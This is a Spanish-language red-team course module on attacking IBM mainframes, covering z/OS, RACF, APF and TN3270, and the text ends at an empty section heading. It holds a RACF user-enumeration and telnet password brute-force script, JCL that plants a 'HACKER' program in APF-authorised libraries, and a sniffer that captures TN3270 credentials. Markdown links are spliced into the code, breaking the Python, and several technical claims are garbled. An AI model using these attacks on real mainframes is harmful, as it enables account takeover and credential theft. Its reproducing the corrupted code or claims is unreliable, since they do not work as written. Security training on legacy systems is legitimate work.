# 03 - Sistemas Legacy y Mainframes

> **Duración:** 4 días (32 hs teórico-prácticas)
> **Dificultad:** Avanzado
> **Role:** [red team](../raw/r3d-t34m-1nfr4.md) / Pentester [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe)

---

## Índice

> ⏱️ **Tiempo estimado:** 15 horas (~3 sesiones) (1960 lineas)


- [1. Introducción a Mainframes y Sistemas Legacy](#1-introducción-a-mainframes-y-sistemas-legacy)
  - [1.1 Qué es un mainframe](#11-qué-es-un-mainframe)
  - [1.2 Historia y evolución](#12-historia-y-evolución)
  - [1.3 Por qué siguen siendo críticos](#13-por-qué-siguen-siendo-críticos)
  - [1.4 Diferencias con sistemas modernos](#14-diferencias-con-sistemas-modernos)
- [2. Arquitectura IBM z/OS](#2-arquitectura-ibm-zos)
  - [2.1 Componentes del sistema](#21-componentes-del-sistema)
  - [2.2 MVS y z/OS base](#22-mvs-y-zos-base)
  - [2.3 JES2/JES3: gestión de trabajos](#23-jes2jes3-gestión-de-trabajos)
  - [2.4 TSO/ISPF: interfaz de usuario](#24-tsospf-interfaz-de-usuario)
  - [2.5 Estructura de datasets](#25-estructura-de-datasets)
  - [2.6 VSAM y gestores de bases de datos](#26-vsam-y-gestores-de-bases-de-datos)
  - [2.7 VTAM y comunicaciones](#27-vtam-y-comunicaciones)
- [3. RACF: Security Framework de Mainframe](#3-racf-security-framework-de-mainframe)
  - [3.1 Conceptos básicos de RACF](#31-conceptos-básicos-de-racf)
  - [3.2 Usuarios y grupos](#32-usuarios-y-grupos)
  - [3.3 Perfiles de recurso](#33-perfiles-de-recurso)
  - [3.4 Clases de recurso](#34-clases-de-recurso)
  - [3.5 Comandos RACF esenciales](#35-comandos-racf-esenciales)
  - [3.6 Enumeración de usuarios RACF](#36-enumeración-de-usuarios-racf)
  - [3.7 Privilegio de escalación en RACF](#37-privilegio-de-escalación-en-racf)
  - [3.8 Bypass de controles de dataset](#38-bypass-de-controles-de-dataset)
- [4. APF Authorization](#4-apf-authorization)
  - [4.1 Qué es APF](#41-qué-es-apf)
  - [4.2 Librerías APF autorizadas](#42-librerías-apf-autorizadas)
  - [4.3 Cómo agregar una librería APF](#43-cómo-agregar-una-librería-apf)
  - [4.4 Explotación de APF](#44-explotación-de-apf)
- [5. Protocolo TN3270](#5-protocolo-tn3270)
  - [5.1 Fundamentos de TN3270](#51-fundamentos-de-tn3270)
  - [5.2 Terminal emulation](#52-terminal-emulation)
  - [5.3 Captura de sesiones TN3270](#53-captura-de-sesiones-tn3270)
  - [5.4 Intercepción de credenciales](#54-intercepción-de-credenciales)
  - [5.5 TN3270 enhanced security](#55-tn3270-enhanced-security)
- [6. AS400 (IBM iSeries)](#6-as400-ibm-iseries)
  - [6.1 Arquitectura AS400](#61-arquitectura-as400)
  - [6.2 Object authority](#62-object-authority)
  - [6.3 Library access control](#63-library-access-control)
  - [6.4 Command security](#64-command-security)
  - [6.5 Program adoption](#65-program-adoption)
  - [6.6 Perfil de usuario y grupos](#66-perfil-de-usuario-y-grupos)
  - [6.7 Vulnerabilidades comunes AS400](#67-vulnerabilidades-comunes-as400)
  - [6.8 Ejercicio: enumeración AS400](#68-ejercicio-enumeración-as400)
- [7. CICS: Customer Information Control System](#7-cics-customer-information-control-system)
  - [7.1 Qué es CICS](#71-qué-es-cics)
  - [7.2 Arquitectura de CICS](#72-arquitectura-de-cics)
  - [7.3 Transacciones CICS](#73-transacciones-cics)
  - [7.4 Comandos CICS vulnerables](#74-comandos-cics-vulnerables)
  - [7.5 Explotación de CICS](#75-explotación-de-cics)
  - [7.6 Protección de CICS](#76-protección-de-cics)
- [8. IMS/DB: Base de Datos Jerárquica](#8-imsdb-base-de-datos-jerárquica)
  - [8.1 Conceptos de IMS/DB](#81-conceptos-de-imsdb)
  - [8.2 Segmentos y bases de datos](#82-segmentos-y-bases-de-datos)
  - [8.3 Acceso no autorizado a IMS](#83-acceso-no-autorizado-a-ims)
  - [8.4 Comandos IMS peligrosos](#84-comandos-ims-peligrosos)
- [9. VTAM y TCP/IP en Mainframe](#9-vtam-y-tcpip-en-mainframe)
  - [9.1 VTAM: Virtual Telecommunications Access Method](#91-vtam-virtual-telecommunications-access-method)
  - [9.2 TCP/IP y mainframe](#92-tcpip-y-mainframe)
  - [9.3 Puertos y servicios expuestos](#93-puertos-y-servicios-expuestos)
  - [9.4 Ataques a la red mainframe](#94-ataques-a-la-red-mainframe)
- [10. Core Banking y Batch Processing](#10-core-banking-y-batch-processing)
  - [10.1 Sistemas core bancarios](#101-sistemas-core-bancarios)
  - [10.2 JCL: Job Control Language](#102-jcl-job-control-language)
  - [10.3 Manipulación de trabajos batch](#103-manipulación-de-trabajos-batch)
  - [10.4 Ataques a procesos batch](#104-ataques-a-procesos-batch)
- [11. Herramientas de Auditoría Mainframe](#11-herramientas-de-auditoría-mainframe)
  - [11.1 TN3270 clients](#111-tn3270-clients)
  - [11.2 RACF utilities](#112-racf-utilities)
  - [11.3 PCOMM y herramientas IBM](#113-pcomm-y-herramientas-ibm)
  - [11.4 Herramientas open-source](#114-herramientas-open-source)
- [12. Laboratorio Final](#12-laboratorio-final)

---

## 1. Introducción a Mainframes y sistemas [legacy](../raw/l3g4cy-3nt3rpr1s3.md)

### 1.1 Qué es un [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe)

Un mainframe es una computadora de alto rendimiento diseñada para procesar grandes volúmenes de transacciones críticas. A diferencia de los servidores [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86) comunes, los mainframes están optimizados para:

- **Disponibilidad 99.999%** (menos de 5 minutos de caída por año)
- **Procesamiento masivo de transacciones** (miles de millones por día)
- **E/S de altísima velocidad** (canales dedicados de fibra óptica)
- **Virtualización nativa** (LPAR: Logical Partitions)
- **Seguridad integrada** (RACF, System z Security)

**Fabricantes principales:**
- **IBM**: z/OS (el más común), z/VM, z/VSE, z/TPF
- **Unisys**: ClearPath MCP, OS 2200
- **Fujitsu**: BS2000

**Dónde se usan:**
- Bancos (90% de las transacciones financieras mundiales)
- Seguros
- Gobierno (AFIP, ANSES, registros civiles)
- Aerolíneas (sistemas de reservas)
- Retail (grandes cadenas)
- Health (historias clínicas)

### 1.2 Historia y evolución

`
1960s: IBM System/360 → Primer mainframe modular
1970s: System/370 → Virtual memory, VM
1980s: System/370 XA → 31-bit addressing
1990s: System/390 → ESCON, Sysplex
2000s: zSeries 900 → 64-bit z/Architecture
2010s: zEnterprise → Integrated analytics
2020s: IBM z16 → On-chip AI, Quantum-safe crypto
`

### 1.3 Por qué siguen siendo críticos

Los mainframes procesan el **70% de las transacciones corporativas del mundo**. Un banco típico procesa 5,000+ transacciones por segundo en su mainframe. Migrar estas aplicaciones a la nube es extremadamente complejo y riesgoso.

**Razones de su [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia):**
- Código [legacy](../raw/l3g4cy-3nt3rpr1s3.md) de décadas ([cobol](../raw/l3g4cy-3nt3rpr1s3.md#cobol), PL/I, Assembler)
- Latencia de transacciones imposible de igualar en x86
- Confiabilidad probada
- Costo de migración prohibitivo
- Falta de talento para mantener [sistemas legacy](../raw/l3g4cy-3nt3rpr1s3.md)

### 1.4 Diferencias con sistemas modernos

| Característica | Mainframe (z/OS) | Linux/Windows |
|---------------|------------------|---------------|
| Arquitectura | z/Architecture (CISC) | x86-64 (RISC-like) |
| Modo de direccionamiento | 64 bits | 64 bits |
| [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos) | z/OS (MVS heredado) | Linux, Windows |
| Seguridad | RACF, Top Secret, ACF2 | [ad](../raw/w1nd0ws-d0m41n-4dm1n.md), LDAP, PAM |
| Lenguaje principal | COBOL, PL/I, Assembler | [python](../raw/pyth0n-f0r-h4ck1ng.md), Java, Go |
| Almacenamiento | Datasets, VSAM | Archivos, SQL DB |
| Interfaz | 3270 terminal | Web, GUI |
| Virtualización | LPAR | Hyper-V, KVM, VMware |


## 2. Arquitectura IBM z/OS

### 2.1 Componentes del sistema

z/OS es un [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos) de 64 bits heredero directo de MVS (Multiple Virtual Storage). Sus componentes principales:

**Núcleo del sistema:**
- **MVS Base**: [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) del sistema, manejo de memoria, procesos, E/S
- **JES2/JES3**: Job Entry Subsystem - gestión de trabajos batch
- **TSO/E**: Time Sharing Option - interfaz interactiva
- **ISPF**: Interactive System Productivity Facility - menús y paneles
- **SDSF**: System Display and Search Facility - monitoreo del sistema
- **RACF**: Resource Access Control Facility - seguridad
- **VTAM**: Virtual Telecommunications Access Method - comunicaciones
- **SMS**: Storage Management Subsystem - gestión de almacenamiento

**LPAR (Logical Partitions):**
z/OS se ejecuta sobre PR/SM (Processor Resource/System Manager) que permite particionar el hardware en LPARs aisladas. Cada LPAR corre su propia instancia de SO.

`
┌──────────────────────────────────────────────────┐
│                IBM z16 Hardware                   │
├──────────┬──────────┬──────────┬──────────────────┤
│  LPAR 1  │  LPAR 2  │  LPAR 3  │      LPAR 4     │
│  z/OS    │  z/OS    │  Linux   │    z/VM         │
│  Prod    │  Test    │  on Z    │    (management)  │
└──────────┴──────────┴──────────┴──────────────────┘
`

### 2.2 MVS y z/OS base

MVS maneja memoria virtual con direccionamiento de 64 bits (16 exabytes teóricos). Conceptos clave:

**Address Spaces:**
Cada usuario/[proceso](../raw/0s-f0nd4m3nt0s.md#procesos) tiene su propio espacio de direcciones (address space) de hasta 16 exabytes, aislado del resto.

`
Address Space Structure:
┌──────────────────────────┐
│ Common Area (shared)     │ ← SQA, CSA, PLPA
├──────────────────────────┤
│  ┌────────────────────┐  │
│  │ User Region        │  │ ← Programa del usuario
│  │ (Private Area)     │  │
│  └────────────────────┘  │
├──────────────────────────┤
│ System Area             │ ← Nucleus, SVC, FRR
└──────────────────────────┘
`

**Dispatchable Units:**
- **Task**: Unidad básica de ejecución (similar a thread)
- **SRB**: Service Request Block (ejecución en modo sistema)
- **TCB**: Task Control Block (ejecución en modo usuario)

### 2.3 JES2/JES3: gestión de trabajos

JES (Job Entry Subsystem) maneja la cola de trabajos batch. Es el corazón del procesamiento por lotes.

**Ciclo de un trabajo batch:**

`
Entrada (Reader) → Conversión (Converter) → Procesamiento (Execution)
    ↓                                               ↓
  Spool (JES spool) ←── Salida (Output writer) ←───┘
`

**Comandos JES esenciales:**

`ash
#  - Comandos de operador JES
D JOB,Q  # Display cola de trabajos
D JOB,<jobname>  # Detalles de un trabajo
C JOB,<jobname>  # Cancelar trabajo
H JOB,<jobname>  # Hold un trabajo
S JOB,<jobname>  # Release un trabajo

# SDSF - Interfaz interactiva
/ SDSF     # Abrir SDSF
ST         # Status de trabajos
I J        # Input queue
O J        # Output queue
LOG        # System log
`

### 2.4 TSO/ISPF: interfaz de usuario

TSO provee acceso interactivo al [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe). ISPF es la interfaz de paneles sobre TSO.

**Comandos básicos TSO:**

`ash
LOGON <userid>     # Iniciar sesión TSO
LOGOFF             # Cerrar sesión
LISTC              # Listar catálogo de datasets
LISTC LEVEL(SYS1.) # Listar datasets SYS1.*
PROFILE            # Ver/configurar perfil TSO
ALLOC              # Alocar un dataset
EDIT <dataset>     # Editar un dataset
VIEW <dataset>     # Ver un dataset
SUBMIT <job>       # Enviar un trabajo JCL
CANCEL <jobid>     # Cancelar un trabajo
STATUS <jobid>     # Estado de un trabajo
`

**Paneles ISPF comunes:**
- 3.1 - Gestionar datasets (List, Edit, View)
- 3.2 - Alocar dataset
- 3.3 - Copiar dataset
- 3.4 - Listar datasets por nivel
- 4 - Enviar y monitorear trabajos
- 6 - Comandos TSO desde ISPF
- 7 - Herramientas de diálogo

### 2.5 Estructura de datasets

Los datasets son la unidad de almacenamiento en z/OS. Son como archivos pero con estructura de registro.

**Tipos de datasets:**
- **Sequential (DSORG=PS)**: Registros secuenciales, similar a un archivo de texto
- **Partitioned (DSORG=PO)**: Particionado en miembros (como un directorio de archivos), PDS o PDSE
- **VSAM**: Virtual Storage Access Method - datasets con acceso por clave
- **Direct (DSORG=DA)**: Acceso directo por dirección
- **Generation Data Group (GDG)**: Grupo de datasets generacionales

**Nomenclatura de datasets:**
`
NIVEL.CALIFICADOR.NOMBRE
SYS1.PARMLIB
SYS1.PROCLIB
USER.PROD.DATA
IBMUSER.JCL.CNTL
`

**Comandos para manipular datasets:**

`ash
# Listar datasets
LISTC LEVEL(USER.)       # Listar datasets USER.*
LISTC ENTRIES            # Listar entradas del catálogo

# Alocar dataset
ALLOC DD(DD1) DSN(USER.TEST.DATA) NEW SPACE(10,5) TRACKS
       LRECL(80) BLKSIZE(800) RECFM(FB)

# Copiar dataset
//COPIA    JOB
//STEP1    EXEC PGM=IEBGENER
//SYSUT1   DD DSN=USER.INPUT.DATA,DISP=SHR
//SYSUT2   DD DSN=USER.OUTPUT.DATA,DISP=NEW
//SYSPRINT DD SYSOUT=*
//SYSIN    DD DUMMY

# Borrar dataset
DELETE 'USER.TEST.DATA'
`

### 2.6 VSAM y gestores de bases de datos

VSAM es el método de acceso a datos más usado en mainframes para aplicaciones transaccionales.

**Tipos de VSAM:**
- **KSDS**: Key Sequenced Data [set](../raw/ph1sh1ng.md#social-engineering-toolkit) - acceso por clave primaria
- **ESDS**: Entry Sequenced Data Set - acceso secuencial por entrada
- **RRDS**: Relative Record Data Set - acceso por número de registro
- **LDS**: Linear Data Set - acceso lineal (raw)

**Bases de datos en mainframe:**
- **IMS/DB**: Base jerárquica (la más común en core bancario)
- **DB2 for z/OS**: Base relacional (IBM DB2)
- **Adabas**: Base de Software AG
- **IDMS**: Base de CA/Broadcom
- **Datacom/DB**: Base de CA/Broadcom

### 2.7 VTAM y comunicaciones

VTAM controla las comunicaciones en el mainframe. Maneja terminales, sesiones, y [redes](../raw/r3d3s-f0nd4m3nt0s.md) SNA.

**Componentes VTAM:**
- **SSCP**: System Services Control Point
- **PU**: Physical Unit (controlador de [red](../raw/r3d3s-f0nd4m3nt0s.md))
- **LU**: Logical Unit (punto final de comunicación, ej: terminal)
- **SESS**: Session entre dos LUs

`
Terminal 3270 ─── PU ─── VTAM ─── Application (CICS, IMS, TSO)
                                      │
                                      ▼
                                 RACF (autenticación)
`

**Puertos VTAM/telnet:**
- **23/[tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)**: TN3270 (telnet 3270)
- **992/tcp**: TN3270S (TN3270 sobre [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)))


## 3. RACF: Security Framework de [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe)

### 3.1 Conceptos básicos de RACF

RACF (Resource Access Control Facility) es el sistema de seguridad nativo de z/OS. Controla:
- Acceso al sistema (quién puede loguearse)
- Acceso a recursos (datasets, transacciones, comandos)
- Auditoría (quién hizo qué, cuándo)
- Administración de usuarios y grupos

También existen alternativas de terceros:
- **Top Secret** (CA/Broadcom): Competidor principal
- **ACF2** (CA/Broadcom): Otro sistema de seguridad

**Arquitectura RACF:**

`
User Request → [router](../raw/r3d3s-f0nd4m3nt0s.md#routers) Table (ICHRFR01) → RACF Decision
                  ↓                         ↓
            Access Control Logic     Profiles Database
            (ICHRFR00, ICHRFR02)    (SYS1.RACFDB.*)
`

### 3.2 Usuarios y grupos

**Estructura de usuarios:**
`ash
# Crear usuario RACF
ADDUSER USERTEST NAME('Usuario de Prueba') OWNER(ADMINS) -
  DFLTGRP(TEST) PASSEXP(90) -
  PASSWORD(Temp1234) NOEXPIRED

# Modificar usuario
ALTUSER USERTEST NAME('Nuevo Nombre') -
  PASSEXP(180) PASSWORD(NewPass1)

# Listar usuario
LISTUSER USERTEST

# Borrar usuario
DELUSER USERTEST

# Crear grupo
ADDGROUP TESTGRP SUPGROUP(SYS1) OWNER(ADMINS)

# Conectar usuario a grupo
CONNECT USERTEST GROUP(TESTGRP) OWNER(ADMINS) -
  UACC(READ) AUTHORITY(USE)
`

**Campos del perfil de usuario:**
- **USERID**: Identificador único (1-8 caracteres)
- **NAME**: Nombre descriptivo
- **OWNER**: Usuario/grupo propietario
- **DFLTGRP**: Grupo por defecto
- **PASSWORD**: Contraseña (encriptada)
- **PASSEXP**: Días hasta expiración
- **UACC**: Universal Access Authority
- **AUTHORITY**: Nivel de autoridad en el grupo
- **SPECIAL**: Atributo de administrador
- **OPERATIONS**: Atributo de operador de recursos

### 3.3 Perfiles de recurso

Los perfiles definen qué usuarios pueden acceder a qué recursos.

`ash
# Definir perfil de dataset
R DEFINE DATASET USER.TEST.** UACC(NONE) OWNER(ADMINS)
PERMIT USER.TEST.** ID(USERTEST) ACCESS(READ)
PERMIT USER.TEST.** ID(ADMINS) ACCESS(UPDATE)

# Definir perfil genérico
R DEFINE DATASET PROD.** UACC(NONE) OWNER(SECURITY)
PERMIT PROD.** ID(TESTGRP) ACCESS(READ) WHEN(DAYS(WEEKDAYS))
`

### 3.4 Clases de recurso

RACF clasifica recursos en clases. Las más importantes:

| Clase | Descripción | Ejemplo |
|-------|-------------|---------|
| DATASET | Protección de datasets | USER.**, SYS1.** |
| USER | Perfiles de usuario | USERTEST |
| GROUP | Perfiles de grupo | TESTGRP |
| FACILITY | Recursos del sistema | BPX.SUPERUSER |
| TERMINAL | Terminales | TSO* |
| PROGRAM | Programas autorizados | RACF.* |
| CICS | Transacciones CICS | CICS.PROD.* |
| IMS | Recursos IMS | IMS.DB.* |
| JES | Recursos JES | JES.SPJEL.* |
| OPERCMDS | Comandos de operador | MVS.STOP.* |
| TSO | Autoridad TSO | TSO.AUTH.* |
| UNIXPRIV | Privilegios UNIX | SUPERUSER |

**Comandos de gestión de clases:**

`ash
# Listar clases activas
SETR LIST

# Activar una clase
SETR CLASSACT(FACILITY)
SETR RACLIST(FACILITY)

# Listar perfiles de una clase
RLIST FACILITY BPX.SUPERUSER ALL

# Buscar perfiles con acceso específico
SEARCH CLASS(FACILITY) FILTER(BPX.**)
`

### 3.5 Comandos RACF esenciales

**Comandos de auditoría y enumeración:**

`ash
# Listar todos los usuarios
SEARCH CLASS(USER)

# Listar usuarios con atributo SPECIAL (admin)
SEARCH CLASS(USER) FILTER(** SPECIAL)

# Listar grupos
SEARCH CLASS(GROUP)

# Listar datasets protegidos
SEARCH CLASS(DATASET)

# Ver perfil completo de un recurso
RLIST DATASET USER.** ALL

# Ver permisos efectivos de un usuario
PERMIT USER.TEST.** CLASS(DATASET) ID(USERTEST) ACCESS(READ) SHOW
`

**Comandos de operación:**

`ash
# Cambiar contraseña (si se conoce la actual)
PASSWORD USERTEST OLDPASS(Vieja123) NEWPASS(Nueva456)

# Revocar usuario
ALTUSER USERTEST REVOKE

# Restaurar usuario revocado
ALTUSER USERTEST RESUME

# Forzar cambio de contraseña en próximo login
ALTUSER USERTEST PASSWORD(Expired1) EXPIRED
`

### 3.6 Enumeración de usuarios RACF

**Técnicas de enumeración:**

1. **Password guessing sin bloqueo:**
`ash
# Si no hay protección contra logins fallidos, se puede brute force
TSO LOGON USERTEST   # Intentar con contraseñas comunes
`

2. **Verificación de existencia de usuarios:**
`ash
# Intentar LISTUSER; si el usuario existe, RACF responde
# Si no existe, da error ICH06001
LISTUSER NOEXISTE
# ICH06001I USER NOEXISTE NOT FOUND
`

3. **Extracción de información de grupos:**
`ash
# Listar miembros de un grupo
LISTGRP TESTGRP
`

4. **Búsqueda de perfiles expuestos:**
`ash
SEARCH CLASS(DATASET) VOLUME(PUB001)
`

**Script de enumeración automatizada:**

`python
#!/usr/bin/env python3
\"\"\"racf_enum.py - Enumeración automatizada RACF\"\"\"

import socket
import telnetlib
import re
from typing import List

class TN3270Enumerator:
    \"\"\"Enumeración RACF vía TN3270\"\"\"

    def __init__(self, host: str, port: int = 23):
        self.host = host
        self.port = port
        self.tn = None

    def connect(self):
        self.tn = telnetlib.Telnet(self.host, self.port)
        self.tn.read_until(b"logon", timeout=10)

    def check_user_exists(self, userid: str) -> bool:
        \"\"\"Verifica si un usuario existe intentando login\"\"\"
        if not self.tn:
            self.connect()
        self.tn.write(f"{userid}\\n".encode())
        self.tn.read_until(b"password", timeout=5)
        self.tn.write(b"FAKEPASS\\n")
        response = self.tn.read_until(b"logon", timeout=10)

        # Si el error es de password (ICH70001I), el usuario existe
        # Si el error es de usuario (ICH06001I), no existe
        if b"ICH70001I" in response:
            return True  # Usuario existe, password incorrecto
        elif b"ICH06001I" in response:
            return False  # Usuario no existe
        return False  # No se pudo determinar

    def enumerate_users(self, wordlist: List[str]) -> List[str]:
        \"\"\"Enumera usuarios existentes\"\"\"
        found = []
        for user in wordlist:
            if self.check_user_exists(user.upper().strip()):
                found.append(user.upper().strip())
                print(f"[+] Usuario encontrado: {user.upper().strip()}")
        return found

    def brute_force(self, userid: str, passwords: List[str]) -> str:
        \"\"\"[fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) de password para un usuario\"\"\"
        for pwd in passwords:
            if not self.tn:
                self.connect()
            self.tn.write(f"{userid}\\n".encode())
            self.tn.read_until(b"password", timeout=5)
            self.tn.write(f"{pwd}\\n".encode())
            response = self.tn.read_until([b"logon", b"ready"], timeout=10)
            if b"ready" in response or b"READY" in response:
                print(f"[+] Password encontrado: {userid}:{pwd}")
                return pwd
        return ""
`

### 3.7 Privilegio de escalación en RACF

**Atributos peligrosos:**
- **SPECIAL**: Superusuario RACF - acceso total a comandos de seguridad
- **OPERATIONS**: Acceso total a recursos protegidos
- **AUDITOR**: Acceso a logs de auditoría
- **ROAUDIT**: Auditoría de solo lectura
- **CLAUTH(x)**: Autoridad para crear perfiles de una clase

**Escalación de privilegios:**

`ash
# Si tenés SPECIAL:
ALTUSER USERTEST SPECIAL  # Dar privilegio a otro usuario

# Si tenés OPERATIONS:
# Podés acceder a cualquier dataset sin restricción

# Si tenés acceso a SYS1.PARMLIB:
# Podés modificar la configuración de arranque del sistema
`

**Vectores de escalación comunes:**

1. **Grupos con excesivos [permisos](../raw/0s-f0nd4m3nt0s.md#permisos):** Buscar grupos con UACC(UPDATE) o superior en datasets críticos
2. **Perfiles mal configurados:** Datasets sin protección o con UACC(READ)
3. **Programas APF autorizados maliciosos:** Insertar programas en APF lib
4. **Contraseñas débiles o defaults:** Muchos sistemas tienen IBMUSER, USERID = password
5. **Scripts JCL con información sensible:** Passwords en texto claro en JCL

### 3.8 Bypass de controles de dataset

**Técnicas de bypass:**

1. **Acceso directo a volumen:**
`ash
ALLOC DD(ANY) DSN(USER.PROD.DATA) VOLUME(PUB001) DISP=SHR
`
Esto evita el control de catálogo, pero RACF aún protege el dataset.

2. **Uso de ICETOOL/SORT para leer datos protegidos:**
`jcl
//STEP1   EXEC PGM=SORT
//SORTIN  DD DSN=CONFIDENTIAL.DATA,DISP=SHR
//SORTOUT DD SYSOUT=*
//SYSIN   DD *
  SORT FIELDS=COPY
/*
`

3. **Programs autorizados para accesso:**
`jcl
//STEP1   EXEC PGM=AUTHORIZED_PROG
//INPUT   DD DSN=CONFIDENTIAL.DATA,DISP=SHR
`

## 4. APF Authorization

### 4.1 Qué es APF

APF (Authorized Program Facility) es un mecanismo que permite que ciertos programas ejecuten instrucciones privilegiadas del sistema. Un programa APF-autorizado puede:

- Ejecutar instrucciones supervisor-mode
- Acceder a memoria del sistema
- Eludir controles de RACF (si el programa lo permite)
- Modificar tablas del sistema

**Importancia en seguridad:**
Cualquier programa que se ejecute desde una librería APF-autorizada tiene poder total sobre el sistema. Si un atacante logra que su programa se cargue desde una APF lib, tiene control total del [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe).

### 4.2 Librerías APF autorizadas

Las librerías APF se definen en el miembro **IEAAFPxx** de SYS1.PARMLIB. También se pueden definir dinámicamente.

`ash
# Ver librerías APF activas
D PROG,APF,ALL

# También se puede ver con
//STEP1   EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSTSIN  DD *
  LISTA APF
/*

# Salida típica:
# SYS1.LINKLIB
# SYS1.CSSLIB
# CEE.SCEERUN
# ISF.SISFLOAD
# SYS1.SIEALNKE
`

### 4.3 Cómo agregar una librería APF

**Método 1: Dinámico (temporal)**
`ash
# Agregar librería APF dinámicamente (requiere autoridad)
SETPROG APF,ADD,DSNAME=USER.APF.LIB,VOLUME=VOL001

# Verificar
D PROG,APF,ALL
`

**Método 2: Permanente (requiere IPL)**
`ash
# Editar SYS1.PARMLIB(IEAAFPxx)
# Agregar línea:
USER.APF.LIB VOL001
`

### 4.4 Explotación de APF

**Técnica principal: Link-listing de un programa a APF lib**

Si un atacante tiene UPDATE access a una librería APF, puede copiar su programa allí:

`ash
# Copiar programa malicioso a librería APF
//COPYPGM JOB
//STEP1   EXEC PGM=IEBCOPY
//INDD    DD DSN=USER.TOOLS.LOAD,DISP=SHR
//OUTDD   DD DSN=SYS1.LINKLIB,DISP=SHR
//SYSIN   DD *
  COPY INDD=INDD,OUTDD=OUTDD
  SELECT MEMBER=((HACKER,R))
/*
`

**Técnica alternativa: Crear nueva librería APF**

Si se tiene SPECIAL en RACF:
`ash
# Alocar dataset
ALLOC DD(APFLIB) DSN(USER.APF.LIB) NEW SPACE(10,5) TRACKS -
  LRECL(80) BLKSIZE(800) RECFM(U) DSORG(PO)

# Copiar programa
//COPY    JOB
//STEP1   EXEC PGM=IEBCOPY
//INDD    DD DSN=USER.HACK.LOAD,DISP=SHR
//OUTDD   DD DSN=USER.APF.LIB,DISP=SHR
//SYSIN   DD *
  COPY INDD=INDD,OUTDD=OUTDD
  SELECT MEMBER=((HACKER))
/*

# Agregar a APF
SETPROG APF,ADD,DSNAME=USER.APF.LIB,VOLUME=VOL001
`

## 5. [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) TN3270

### 5.1 Fundamentos de TN3270

TN3270 es la emulación del terminal IBM 3270 sobre [tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip). Es la forma principal de acceder al [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe).

**Características del protocolo 3270:**
- **Orientado a pantalla**: No envía caracteres individuales sino pantallas completas
- **Buffer de pantalla**: Matriz de 24-80 caracteres
- **Campos protegidos/desprotegidos**: El host define qué campos puede modificar el usuario
- **AID (Attention Identifier)**: Identificador de tecla presionada (Enter, PF1, PA1)
- **Comandos de formato**: SBA, SF, IC, RA (cambian atributos de la pantalla)

**Estructura de flujo de datos 3270:**

`
┌──────────────────────────────────────────────────┐
│  Header (1 byte): Write, Read, Erase/Write, etc  │
├──────────────────────────────────────────────────┤
│  Commands (3 bytes): SBA + addr (cursor position)│
├──────────────────────────────────────────────────┤
│  Attributes (1 byte): Protected, Intensified, etc│
├──────────────────────────────────────────────────┤
│  Text Data ([variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables)): Pantalla de contenido     │
├──────────────────────────────────────────────────┤
│  Order Codes (1 byte): SF (Start Field), IC etc  │
└──────────────────────────────────────────────────┘
`

### 5.2 Terminal emulation

**Clientes TN3270 comunes:**

| Cliente | Plataforma | Características |
|---------|------------|-----------------|
| IBM PCOMM | Windows | Oficial IBM, [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) |
| Extra! | Windows | Very buen soporte |
| Reflection Desktop | Windows | Micro Focus |
| Putty con 3270 | Win/Linux | Gratuito |
| x3270 | Linux/Mac/Win | Open-source |
| QWS3270 | Windows | Quick3270 |
| Mocha TN3270 | Windows | Ligero |

**Conexión básica con x3270:**
`ash
# Conexión básica
x3270 mainframe.empresa.[com](../raw/w1n-s9bsyst3ms.md#com)

# Conexión con SSL
x3270 -secure mainframe.empresa.com:992

# Scripting con c3270 (modo consola)
c3270 -script mainframe.empresa.com << EOF
Wait(10s)
String("IBMUSER")
Tab
String("PASSWORD")
Enter
Wait(5s)
EOF
`

### 5.3 Captura de sesiones TN3270

Si el tráfico TN3270 no está encriptado ([puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 23, no 992), es posible interceptar las sesiones:

`ash
# Captura con tcpdump
[tcpdump](../raw/r3d3s-f0nd4m3nt0s.md#tcpdump) -i eth0 port 23 -w tn3270_capture.pcap

# Analizar con Wireshark
[wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) -r tn3270_capture.pcap
`

**Análisis de tráfico TN3270 en [python](../raw/pyth0n-f0r-h4ck1ng.md):**

`python
#!/usr/bin/env python3
\"\"\"tn3270_sniffer.py - Sniffer de sesiones TN3270\"\"\"

from scapy.all import *
from typing import Optional

class TN3270Sniffer:
    def __init__(self, interface: str = "eth0"):
        self.interface = interface

    def packet_callback(self, packet):
        if packet.haslayer(Raw) and packet.haslayer([tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)):
            [payload](../raw/m3t4spl01t.md#payloads) = packet[Raw].load
            if b"IBMUSER" in payload or b"password" in payload:
                print(f"[!] Posible credencial capturada de {packet[[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)].src}")
                print(f"    Payload: {payload}")

    def start_sniffing(self, filter_expr: str = "port 23 or port 992"):
        print(f"[*] Sniffeando TN3270 en {self.interface}")
        sniff(iface=self.interface, filter=filter_expr,
              prn=self.packet_callback, store=False)

    def analyze_pcap(self, pcap_file: str):
        \"\"\"Analiza un archivo pcap en busca de credenciales\"\"\"
        packets = rdpcap(pcap_file)
        for pkt in packets:
            if pkt.haslayer(Raw) and pkt.haslayer(TCP):
                data = pkt[Raw].load
                # Buscar patrones de login TSO
                if b"LOGON" in data or b"logon" in data:
                    print(f"[!] Posible inicio de sesión en paquete {pkt.time}")
                    print(f"    Data: {data[:500]}")
`

### 5.4 Intercepción de credenciales

